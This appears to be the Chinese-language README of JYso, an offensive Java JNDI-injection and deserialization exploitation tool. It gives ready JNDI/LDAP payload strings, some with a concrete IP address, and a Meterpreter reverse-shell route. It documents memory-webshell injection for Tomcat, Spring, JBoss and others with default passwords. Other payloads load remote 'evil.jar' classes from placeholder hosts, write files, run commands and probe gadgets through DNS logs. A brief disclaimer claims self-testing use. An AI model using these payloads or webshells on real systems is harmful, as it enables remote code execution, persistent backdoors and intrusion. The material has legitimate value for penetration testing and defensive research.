## JYso <https://github.com/qi4L/JYso>
<!--auto_detail_badge_begin_0b490ffb61b26b45de3ea5d7dd8a582e-->
![Language](https://img.shields.io/badge/Language-Java-blue)
![Author](https://img.shields.io/badge/Author-qi4L-orange)
![GitHub stars](https://img.shields.io/github/stars/qi4L/JYso.svg?style=flat&logo=github)
![Version](https://img.shields.io/badge/Version-V1.3.5-red)
![Time](https://img.shields.io/badge/Join-20230626-green)
<!--auto_detail_badge_end_fef74f2d7ea73fcc43ff78e05b1e7451-->

# 😈使用说明

```所有使用示例，用的是Yakit的FUZZ语法```

使用 ```java -jar JNDIExploit-[version].jar -h``` 查看参数说明，其中 ```--ip``` 参数为必选参数

```
Usage: java -jar JNDIExploit-[version].jar [options]
  Options:
  * -i,  --ip       Local ip address  (default: 0.0.0.0)
    -rP, --rmiPort  rmi bind port (default: 1099)
    -lP, --ldapPort Ldap bind port (default: 1389)
    -hP, --httpPort Http bind port (default: 3456)
    -g,  --gadgets   Show gadgets (default: false)
    -c,  --command  RMI this command
    -h,  --help     Show this help
```

* 目前支持的所有 ```PayloadType``` 为
    * ```Bypass```: 用于rmi本地工厂类加载，通过添加自定义```header``` ```nu1r: whoami``` 的方式传递想要执行的命令
    * ```TomcatEcho```: 用于在中间件为 ```Tomcat``` 时命令执行结果的回显，通过添加自定义```header``` ```cmd: whoami```
      的方式传递想要执行的命令
    * ```SpringEcho```: 用于在框架为 ```SpringMVC/SpringBoot```
      时命令执行结果的回显，通过添加自定义```header``` ```nu1r: whoami``` 的方式传递想要执行的命令
    * ```JbossEcho```: Jboss 命令执行回显, 通过添加自定义```header``` ```nu1r: whoami``` 的方式传递想要执行的命令
    * ```AllEcho```: 自动选择命令执行回显, 通过添加自定义```header``` ```nu1r: whoami``` 的方式传递想要执行的命令
    * ```nu1r```：用于执行命令，如果命令有特殊字符，支持对命令进行 Base64编码后传输

```
{{url
  (${jndi:ldap://0.0.0.0:1389/TomcatBypass/nu1r/Base64/{{base64
      (ping xxx.dnstunnel.run)
  }}})
}}
```    

- 支持tomcatBypass路由直接上线msf：

```
  使用msf的java/meterpreter/reverse_tcp开启监听
  ldap://127.0.0.1:1389/TomcatBypass/Meterpreter/msf/[msfip]/[msfport]
```

---

# 🦄内存马

两种添加方式：

- 支持引用远程类加载方式打入（Basic路由）。
- 支持本地工厂类加载方式打入（TomcatBypass路由）。

使用说明：
不指定类型就默认为冰蝎马。

- t 选择内存马的类型
    - 不指定类型就默认为冰蝎马
    - bx: 冰蝎内存马，```key: nu1ryyds```, ```Referer：https://nu1r.cn/```
    - gz: 哥斯拉内存马，```pass: nu1r```, ```Referer：https://nu1r.cn/```
    - gzraw: 哥斯拉 raw 类型的内存马, ```pass: nu1r```, ```Referer：https://nu1r.cn/```
    - cmd: cmd命令回显内存马。
- a：是否继承恶意类 AbstractTranslet
- o：使用反射绕过
- w：Windows下使用Agent写入
- l：Linux下使用Agent写入
- u：内存马绑定的路径,default [/version.txt]
- pw：内存马的密码,default [p@ssw0rd]
- r：内存马 Referer check,default [https://nu1r.cn/]
- h：通过将文件写入$JAVA_HOME来隐藏内存shell，目前只支持 SpringControllerMS
- ht：隐藏内存外壳，输入1:write /jre/lib/charsets.jar 2:write /jre/classes/

示例

```shell
{{url
    (${jndi:ldap://111.229.10.212:1389/Basic/tomcatfilterjmx/shell/-u path223 -pw 123456 -r tth.cn})
}}
```

内存马说明：

* ```SpringInterceptor```: 向系统内植入 Spring Interceptor 类型的内存马
* ```SpringController```: 向系统内植入 Spring Controller 类型的内存马
* ```JettyFilter```: 利用 JMX MBeans 向系统内植入 Jetty Filter 型内存马
* ```JettyServlet```: 利用 JMX MBeans 向系统内植入 Jetty Servlet 型内存马
* ```JBossFilter```: 通过全局上下文向系统内植入 JBoss/Wildfly Filter 型内存马
* ```JBossServlet```: 通过全局上下文向系统内植入 JBoss/Wildfly Servlet 型内存马
* ```resinFilterTh```: 通过线程类加载器获取指定上下文系统内植入 Resin Filter 型内存马
* ```resinServletTh```: 通过线程类加载器获取指定上下文系统内植入 Resin Servlet 型内存马
* ```WebsphereMemshell```: 用于植入```Websphere内存shell```， 支持```Behinder shell``` 与 ```Basic cmd shell```
* ```tomcatFilterJmx```: 利用 JMX MBeans 向系统内植入 Tomcat Filter 型内存马
* ```tomcatFilterTh```: 通过线程类加载器获取指定上下文向系统内植入 Tomcat Filter 型内存马
* ```TomcatListenerJmx```: 利用 JMX MBeans 向系统内植入 Tomcat Listener 型内存马
* ```TomcatListenerTh```: 通过线程类加载器获取指定上下文向系统内植入 Tomcat Listener 型内存马
* ```TomcatServletJmx```: 利用 JMX MBeans 向系统内植入 Tomcat Servlet 型内存马
* ```TomcatServletTh```: 通过线程类加载器获取指定上下文向系统内植入 Tomcat Servlet 型内存马
* ```WSFilter```: `CMD` 命令回显 WebSocket 内存马，`cmd命令回显`
* ```TomcatExecutor``` : Executor 内存马，`cmd命令回显`
* ```TomcatUpgrade```: TomcatUpgrade 内存马，`cmd命令回显`
* ```Struts2ActionMS```: Action 类型内存马

---

# 👻 BeanShell1 与 Clojure 利用链的拓展

对于 `BeanShell1` 及 `Clojure` 这两个基于脚本语言解析的漏利用方式。

本项目为这两条利用链拓展了除了 Runtime 执行命令意外的多种利用方式，具体如下：

`Base64/`后的内容需要base64编码

TS ：Thread Sleep - 通过 Thread.sleep() 的方式来检查是否存在反序列化漏洞，使用命令：TS-10

```
{{url
    (${jndi:ldap://0.0.0.0:1389/Deserialization/Clojure/nu1r/Base64/{{base64
        (TS-10)
    }}})
}}
```

RC ：Remote Call - 通过 URLClassLoader.loadClass()
来调用远程恶意类并初始化，使用命令：RC-http://xxxx.com/evil.jar#EvilClass

换成CS或者MSF生成的JAR包，即可完成一键上线。

```
{{url
    (${jndi:ldap://0.0.0.0:1389/Deserialization/Clojure/nu1r/Base64/{{base64
        (RC-http://xxxx.com/evil.jar#EvilClass)
    }}})
}}
```

WF ：Write File - 通过 FileOutputStream.write() 来写入文件，使用命令：WF-/tmp/shell#123

```
{{url
    (${jndi:ldap://0.0.0.0:1389/Deserialization/Clojure/nu1r/Base64/{{base64
        (WF-/tmp/shell#123)
    }}})
}}
```

其他：普通命令执行 - 通过 ProcessBuilder().start() 执行系统命令，使用命令 whoami

```
{{url
    (${jndi:ldap://0.0.0.0:1389/Deserialization/Clojure/nu1r/Base64/{{base64
        (whoami)
    }}})
}}
```

---

# 🐗C3P04的使用

* 远程加载 Jar 包
    * C3P04 'remoteJar-http://1.1.1.1.com/1.jar'
* 向服务器写入 Jar 包并加载（不出网）
    * C3P04 'writeJar-/tmp/evil.jar:./yaml.jar'
    * C3P04 'localJar-./yaml.jar'
* C3P0 二次反序列化
    * C3P04 'c3p0Double-/usr/CC6.ser'

```
{{url
    (${jndi:ldap://0.0.0.0:1389/Deserialization/C3P04/nu1r/Base64/{{base64
        ([base64_encoded_cmd])
    }}})
}}
```

---

# 🐅SignedObject 二次反序列化 Gadget

用来进行某些场景的绕过（常见如 TemplatesImpl 黑名单，CTF 中常出现的 CC 无数组加黑名单等）

利用链需要调用 SignedObject 的 getObject 方法，因此需要可以调用任意方法、或调用指定类 getter 方法的触发点；

大概包含如下几种可用的常见调用链：

1. InvokerTransformer 调用任意方法（依赖 CC）
2. BeanComparator 调用 getter 方法（依赖 CB）
3. BasicPropertyAccessor$BasicGetter 调用 getter 方法(依赖 Hibernate)
4. ToStringBean 调用全部 getter 方法（依赖 Rome）
5. MethodInvokeTypeProvider 反射调用任意方法（依赖 spring-core）
6. MemberBox 反射调用任意方法（依赖 rhino）

* `cc`,`cc4`,`cb`,`hibernate`,`rome`,`rhino`,`spring`

* 利用方式：
* SignedObjectPayload -> 'CC:CommonsCollections6:b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA==:1:10000' 最后两个参数是反序列化的类型

```
{{url
    (${jndi:ldap://0.0.0.0:1389/Deserialization/SignedObject/nu1r/Base64/{{base64
        (CC:commonscollections6:{{base64
            (open -a Calculator.app)
        }}1::10000)
    }}})
}}
```

效果图：

![](https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown微信截图_20220820135253.png)

---

# 🕷️Deserialization路由

| Gadget                                      | 依赖                                                                                                                                                                                                                                                                         | ps            |
|:--------------------------------------------|:---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|---------------|
| AspectJWeaver                               | aspectjweaver:1.9.2<br/>commons-collections:3.2.2                                                                                                                                                                                                                          |               |
| AspectJWeaver2                              | org.aspectj:aspectjweaver:1.9.2<br/>commons-collections:commons-collections:3.2.2                                                                                                                                                                                          |               |
| BeanShell1                                  | org.beanshell:bsh:2.0b5                                                                                                                                                                                                                                                    |               |
| C3P0                                        | com.mchange:c3p0:0.9.5.2<br/>mchange-commons-java:0.2.11                                                                                                                                                                                                                   |               |
| C3P02                                       | com.mchange:c3p0:0.9.5.2<br/>com.mchange:mchange-commons-java:0.2.11<br/>org.apache:tomcat:8.5.35                                                                                                                                                                          |               |
| C3P03                                       | com.mchange:c3p0:0.9.5.2<br/>com.mchange:mchange-commons-java:0.2.11<br/>org.apache:tomcat:8.5.35<br/>org.codehaus.groovy:groovy:2.3.9                                                                                                                                     |               |
| C3P04                                       | com.mchange:c3p0:0.9.5.2<br/>com.mchange:mchange-commons-java:0.2.11<br/>org.apache:tomcat:8.5.35<br/>org.yaml:snakeyaml:1.30                                                                                                                                              |               |
| C3P092                                      | com.mchange:c3p0:0.9.2-pre2-RELEASE ~ 0.9.5-pre8<br/>com.mchange:mchange-commons-java:0.2.11                                                                                                                                                                               |               |
| Click1                                      | org.apache.click:click-nodeps:2.3.0<br/>javax.servlet:javax.servlet-api:3.1.0                                                                                                                                                                                              |               |
| Clojure                                     | org.clojure:clojure:1.8.0                                                                                                                                                                                                                                                  |               |
| CommonsBeanutils1                           | commons-beanutils:commons-beanutils:1.9.2<br/>commons-collections:commons-collections:3.1<br/>commons-logging:commons-logging:1.2                                                                                                                                          |               |
| CommonsBeanutils1Jdbc                       |                                                                                                                                                                                                                                                                            | 高版本Bypass     |
| CommonsBeanutils2                           | commons-beanutils:commons-beanutils:1.9.2                                                                                                                                                                                                                                  | 可打shiro       |
| CommonsBeanutils2Jdbc                       |                                                                                                                                                                                                                                                                            | 高版本Bypass     |
| CommonsBeanutils2NOCC                       | commons-beanutils:commons-beanutils:1.8.3<br/>commons-logging:commons-logging:1.2                                                                                                                                                                                          |               |
| CommonsBeanutils1183NOCC                    | commons-beanutils:commons-beanutils:1.8.3                                                                                                                                                                                                                                  |               |
| CommonsBeanutilsAttrCompare                 | commons-beanutils:commons-beanutils:1.9.2                                                                                                                                                                                                                                  |               |
| CommonsBeanutilsAttrCompare183              | commons-beanutils:commons-beanutils:1.8.3                                                                                                                                                                                                                                  |               |
| CommonsBeanutilsObjectToStringComparator    | "commons-beanutils:commons-beanutils:1.9.2 org.apache.commons:commons-lang3:3.10"                                                                                                                                                                                          |               |
| CommonsBeanutilsObjectToStringComparator183 | "commons-beanutils:commons-beanutils:1.8.3"                                                                                                                                                                                                                                |               |
| CommonsBeanutilsPropertySource              | "commons-beanutils:commons-beanutils:1.9.2 org.apache.logging.log4j:log4j-core:2.17.1"                                                                                                                                                                                     |               |
| CommonsBeanutilsPropertySource183           | "commons-beanutils:commons-beanutils:1.9.2 org.apache.logging.log4j:log4j-core:2.17.1"                                                                                                                                                                                     |               |
| CommonsCollections1                         | commons-collections:commons-collections:3.1                                                                                                                                                                                                                                |               |
| CommonsCollections2                         | org.apache.commons:commons-collections4:4.0                                                                                                                                                                                                                                |               |
| CommonsCollections3                         | commons-collections:commons-collections:3.1                                                                                                                                                                                                                                |               |
| CommonsCollections4                         | org.apache.commons:commons-collections4:4.0                                                                                                                                                                                                                                |               |
| CommonsCollections5                         | commons-collections:commons-collections:3.1                                                                                                                                                                                                                                |               |
| CommonsCollections6                         | commons-collections:commons-collections:3.1                                                                                                                                                                                                                                |               |
| CommonsCollections7                         | commons-collections:commons-collections:3.1                                                                                                                                                                                                                                |               |
| CommonsCollections8                         | org.apache.commons:commons-collections4:4.0                                                                                                                                                                                                                                |               |
| CommonsCollections9                         | commons-collections:commons-collections:3.2.1                                                                                                                                                                                                                              |               |
| CommonsCollections10                        | commons-collections:commons-collections:3.2.1                                                                                                                                                                                                                              |               |
| CommonsCollections11                        | commons-collections:commons-collections:3.2.1                                                                                                                                                                                                                              |               |
| CommonsCollections12                        | commons-collections:commons-collections:3.2.1                                                                                                                                                                                                                              |               |
| CommonsCollectionsK1                        | commons-collections:commons-collections:3.2.1                                                                                                                                                                                                                              |               |
| CommonsCollectionsK2                        | org.apache.commons:commons-collections4:4.0                                                                                                                                                                                                                                |               |
| CommonsCollectionsK3                        | commons-collections:commons-collections:3.1                                                                                                                                                                                                                                | CC6简化的写法      |
| CommonsCollectionsK4                        | org.apache.commons:commons-collections4:4.0                                                                                                                                                                                                                                | CC6简化的写法的4.0版 |
| CommonsCollectionsK5                        | org.apache.commons:commons-collections4:4.0                                                                                                                                                                                                                                | CC7的4.0版      |
| CommonsCollectionsK6                        | org.apache.commons:commons-collections4:4.0                                                                                                                                                                                                                                | CC11的4.0版     |
| Fastjson1                                   | Fastjosn 1.2.48                                                                                                                                                                                                                                                            |               |
| Fastjson2                                   | Fastjosn 2+                                                                                                                                                                                                                                                                |               |
| Groovy1                                     | org.codehaus.groovy:groovy:2.3.9                                                                                                                                                                                                                                           |               |
| Hibernate1                                  | org.hibernate:hibernate-core:5.0.7.Final<br/>org.hibernate:hibernate-core:4.3.11.Final                                                                                                                                                                                     |               |
| Hibernate2                                  | org.hibernate:hibernate-core:5.0.7.Final<br/>org.hibernate:hibernate-core:4.3.11.Final                                                                                                                                                                                     |               |
| Jackson                                     |                                                                                                                                                                                                                                                                            |               |
| JavassistWeld1                              | javassist:javassist:3.12.1.GA<br/>org.jboss.weld:weld-core:1.1.33.Final<br/>javax.interceptor:javax.interceptor-api:3.1<br/>javax.enterprise:cdi-api:1.0-SP1<br/>org.jboss.interceptor:jboss-interceptor-spi:2.0.0.Final<br/>org.slf4j:slf4j-api:1.7.21                    |               |
| JBossInterceptors1                          | javassist:javassist:3.12.1.GA<br/>org.jboss.interceptor:jboss-interceptor-core:2.0.0.Final<br/>javax.enterprise:cdi-api:1.0-SP1<br/>javax.interceptor:javax.interceptor-api:3.1<br/>org.slf4j:slf4j-api:1.7.21<br/>org.jboss.interceptor:jboss-interceptor-spi:2.0.0.Final |               |
| Jdk7u21                                     | -                                                                                                                                                                                                                                                                          |               |
| Jdk7u21variant                              | -                                                                                                                                                                                                                                                                          |               |
| JRE8u20                                     |                                                                                                                                                                                                                                                                            |               |
| JRE8u20_2                                   |                                                                                                                                                                                                                                                                            |               |
| JSON1                                       | net.sf.json-lib:json-lib:jar:jdk15:2.4<br/>org.springframework:spring-aop:4.1.4.RELEASE                                                                                                                                                                                    |               |
| Jython1                                     | org.python:jython-standalone:2.5.2                                                                                                                                                                                                                                         |               |
| MozillaRhino1                               | rhino:js:1.7R2                                                                                                                                                                                                                                                             |               |
| MozillaRhino2                               | rhino:js:1.7R2                                                                                                                                                                                                                                                             |               |
| Myfaces1                                    | -                                                                                                                                                                                                                                                                          |               |
| Myfaces2                                    | -                                                                                                                                                                                                                                                                          |               |
| RenderedImage                               | javax.media:jai-codec-1.1.3                                                                                                                                                                                                                                                |               |
| ROME                                        | rome:rome:1.0                                                                                                                                                                                                                                                              |               |
| ROME2                                       | rome:rome:1.0<br/>JDK 8+                                                                                                                                                                                                                                                   |               |
| Spring1                                     | org.springframework:spring-core:4.1.4.RELEASE<br/>org.springframework:spring-beans:4.1.4.RELEASE                                                                                                                                                                           |               |
| Spring2                                     | org.springframework:spring-core:4.1.4.RELEASE<br/>org.springframework:spring-aop:4.1.4.RELEASE<br/>aopalliance:aopalliance:1.0<br/>commons-logging:commons-logging:1.2                                                                                                     |               |
| Spring3                                     | org.springframework:spring-tx:5.2.3.RELEASE<br/>org.springframework:spring-context:5.2.3.RELEASE<br/>javax.transaction:javax.transaction-api:1.2                                                                                                                           |               |
| Vaadin1                                     | com.vaadin:vaadin-server:7.7.14<br/>com.vaadin:vaadin-shared:7.7.14                                                                                                                                                                                                        |               |
| Wicket1                                     | org.apache.wicket:wicket-util:6.23.0<br/>org.slf4j:slf4j-api:1.6.4                                                                                                                                                                                                         |               |

- a：恶意类是否继承 AbstractTranslet
- o：使用反射绕过
  ~~- j：使用 ObjectInputStream/ObjectOutputStream 来构造序列化流~~（这个构造的流有BUG，还在思考修复）
- 需要参数时，在命令后面添加，#参数
* 使用示例：

```
{{url
  (${jndi:ldap://0.0.0.0:1389/Deserialization/[GadgetType]/nu1r/Base64/{{base64
      (base64_encoded_cmd#-a -o)
  }}})
}}
 ```

---
对于Gadget：

- CommonsCollections1
- CommonsCollections5
- CommonsCollections6
- CommonsCollectionsK3
- CommonsCollectionsK4
- CommonsCollections7
- commonscollectionsK5
- CommonsCollections9

* 使用 `Transformer[]` 数组实现

为其拓展了除了 Runtime 执行命令意外的多种利用方式，具体如下：

TS ：Thread Sleep - 通过 Thread.sleep() 的方式来检查是否存在反序列化漏洞，使用命令：TS-10

```
{{url
    (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/{{base64
        (TS-10)
    }}})
}}
```

RC ：Remote Call - 通过 URLClassLoader.loadClass()
来调用远程恶意类并初始化，使用命令：RC-http://xxxx.com/evil.jar#EvilClass

```
{{url
    (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/{{base64
        (RC-http://xxxx.com/evil.jar#EvilClass)
    }}})
}}
```

WF ：Write File - 通过 FileOutputStream.write() 来写入文件，使用命令：WF-/tmp/shell#d2hvYW1p

```
{{url
    (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/{{base64
        (WF-/tmp/shell#d2hvYW1p)
    }}})
}}
```

PB ：ProcessBuilder 通过 ProcessBuilder.start() 来执行系统命令，使用命令 ```PB-lin-d2hvYW1p``` / ```PB-win-d2hvYW1p```
分别在不同操作系统执行命令

```
{{url
    (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/{{base64
        (PB-lin-b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA==)
    }}})
}}
```

SE ：ScriptEngine - 通过 ScriptEngineManager.getEngineByName('js').eval() 来解析 JS 代码调用 Runtime 执行命令，使用命令
SE-d2hvYW1

```
{{url
    (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/{{base64
        (SE-d2hvYW1)
    }}})
}}
```

DL ：DNS LOG - 通过 InetAddress.getAllByName() 来触发 DNS 解析，使用命令 DL-xxxdnslog.cn

```
{{url
    (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/{{base64
        (DL-xxxdnslog.cn)
    }}})
}}
```

HL ：HTTP LOG - 通过 URL.getContent() 来触发 HTTP LOG，使用命令 HL-http://xxx.com

```
{{url
    (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/{{base64
        (HL-http://xxx.com)
    }}})
}}
```

BC ：BCEL Classloader - 通过 ..bcel...ClassLoader.loadClass().newInstance() 来加载 BCEL 类字节码，使用命令 BC-$BCEL$xxx

```
{{url
    (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/{{base64
        (BC-$BCEL$xxx)
    }}})
}}
```

其他：普通命令执行 - 通过 Runtime.getRuntime().exec() 执行系统命令，使用命令 whoami

```
{{url
    (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/{{base64
        (whoami)
    }}})
}}
```

# 🐣其他利用链拓展

对于除了以上的利用链,使用的是 `TemplatesImpl` 类来实现。

```
{{url
    (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections3/nu1r/Base64/{{base64
        (whoami)
    }}})
}}
```

## 🐮任意自定义代码

对于使用了 `TemplatesImpl` 类来实现的链子来说，可以使用此方法

如果你不想使用本项目中提供的恶意逻辑，也不想执行命令，可以通过自定义代码的形式，自定义代码将会在目标服务器通过 `ClassLoader`
进行加载并实例化。命令使用 `LF#` 开头，后面跟指定自定义类字节码文件的绝对路径。

示例：

**class 类文件绝对路径**

```
{{url
  (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections3/nu1r/Base64/{{base64
      (LF#/tmp/evil.class-org)
  }}})
}}
```

# 🦜利用链探测

参考了 kezibei 师傅的 URLDNS 项目，实际情况可能有如下几种情况导致问题：

+ 反序列时遇到黑名单，可能导致后面的类的 dnslog 出不来；
+ 反序列化流程中由于种种情况报错可能导致出不来。

因此这里还是提供了 all/common/指定类 三种探测方式：

+ all：探测全部的类；
+ common：探测不常在黑名单中的 CommonsBeanutils2/C3P0/AspectJWeaver/bsh/winlinux；
+ 指定类：使用对应链中的关键字 CommonsCollections24:xxxx.dns.log 。

```
{{url
    (${jndi:ldap://0.0.0.0:1389/Deserialization/URLDNS/nu1r/Base64/{{base64
        (all:xxxxxx.dns.log)
    }}})
}}
```

效果图：

![](https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownQQ截图20221107151444.png)

| DNSLOG 关键字                               | 对应链                  | 关键类                                                       | 备注                                                         |
| ------------------------------------------- | ----------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
| cc31or321<br />cc322                        | CommonsCollections13567 | org.apache.commons.collections.functors.ChainedTransformer<br />org.apache.commons.collections.ExtendedProperties$1 | CommonsCollections1/3/5/6/7<br />需要<=3.2.1版本             |
| cc40<br />cc41                              | CommonsCollections24    | org.apache.commons.collections4.functors.ChainedTransformer<br />org.apache.commons.collections4.FluentIterable | CommonsCollections2/4链<br />需要4-4.0版本                   |
| cb17<br />cb18x<br />cb19x                  | CommonsBeanutils2       | org.apache.commons.beanutils.MappedPropertyDescriptor\$1<br />org.apache.commons.beanutils.DynaBeanMapDecorator\$MapEntry<br />org.apache.commons.beanutils.BeanIntrospectionData | 1.7x-1.8x为-3490850999041592962<br />1.9x为-2044202215314119608 |
| c3p092x<br />c3p095x                        | C3P0                    | com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase<br />com.mchange.v2.c3p0.test.AlwaysFailDataSource | 0.9.2pre2-0.9.5pre8为7387108436934414104<br />0.9.5pre9-0.9.5.5为7387108436934414104 |
| ajw                                         | AspectJWeaver           | org.aspectj.weaver.tools.cache.SimpleCache                   | AspectJWeaver,需要cc31                                       |
| bsh20b4<br />bsh20b5<br />bsh20b6           | bsh                     | bsh.CollectionManager\$1<br />bsh.engine.BshScriptEngine<br />bsh.collection.CollectionIterator\$1 | 2.0b4为4949939576606791809<br />2.0b5为4041428789013517368<br />2.0.b6无法反序列化 |
| groovy1702311<br />groovy24x<br />groovy244 | Groovy                  | org.codehaus.groovy.reflection.ClassInfo\$ClassInfoSet<br />groovy.lang.Tuple2<br />org.codehaus.groovy.runtime.dgm\$1170 | 2.4.x为-8137949907733646644<br />2.3.x为1228988487386910280  |
| becl                                        | Becl                    | com.sun.org.apache.bcel.internal.util.ClassLoader            | JDK<8u251                                                    |
| Jdk7u21                                     | Jdk7u21                 | com.sun.corba.se.impl.orbutil.ORBClassLoader                 | JDK<=7u21                                                    |
| JRE8u20                                     | JRE8u20                 | javax.swing.plaf.metal.MetalFileChooserUI\$DirectoryComboBoxModel\$1 | 7u25<=JDK<=8u20<br />这个检测不完美,8u25版本以及JDK<=7u21会误报<br />可综合Jdk7u21来看 |
| linux<br />windows                          | winlinux                | sun.awt.X11.AwtGraphicsConfigData<br />sun.awt.windows.WButtonPeer | windows/linux版本判断                                        |
|                                             | all                     |                                                              | 全部检测                                                     |

# 🐳自定义

+ 自定义链子

在 `com.nu1r.jndi.gadgets` 下新建JAVA文件，并实现接口 ObjectPayload 后在 getObject 方法中编写链子逻辑即可。
使用

```
{{url
    (${jndi:ldap://0.0.0.0:1389/Deserialization/自定义链子的类名/nu1r/Base64/{{base64
        (whoami)
    }}})
}}
```

+ 自定义内存马

在 `com.nu1r.jndi.template` 下新建 JAVA 文件并将主要实现方法写在静态代码块中。

额外方法与 shell 通过 javassist 引入 `com.nu1r.jndi.template.shell.MemShellPayloads`(最小化有效负载的大小)

使用与上面内存马使用一致

---

# 👮免责声明

该工具仅用于安全自查检测

由于传播、利用此工具所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。

本人拥有对此工具的修改和解释权。未经网络安全部门及相关部门允许，不得善自使用本工具进行任何攻击活动，不得以任何方式将其用于商业目的。

# 🦚TODO

GroovyBypass路由与WebsphereBypass路由的具体实现功能还在思考中

# 🐲建议

本项目用JDK1.8.0_332开发，不推荐用高于11的JDK，可能会出现错误

<!--auto_detail_active_begin_e1c6fb434b6f0baf6912c7a1934f772b-->
## 项目相关


## 最近更新

#### [v1.3.5] - 2024-11-01

**更新**  
- trustSerialData 绕过，Bypass jdk20 21  
- TomcatJdbc，通过jdbc来构造H2 Payload进行代码执行

#### [v1.3.4] - 2024-09-16

**更新**  
- 增加Marshalsec output

#### [v1.3.3] - 2024-08-26

**更新**  
- 新增cc链  
- XStream Payload  
- 新增ldaps协议利用  
- 修复BUG若干

#### [v1.3.2] - 2024-07-24

**更新**  
- 增加CC13链的实现  
- 修复CC4链的错误

#### [v1.3.1] - 2024-05-29

**更新**  
* 给回显类添加构造函数写法版本  
* 修复JNDI模式下TomcatBypass路由失效问题

<!--auto_detail_active_end_f9cf7911015e9913b7e691a7a5878527-->
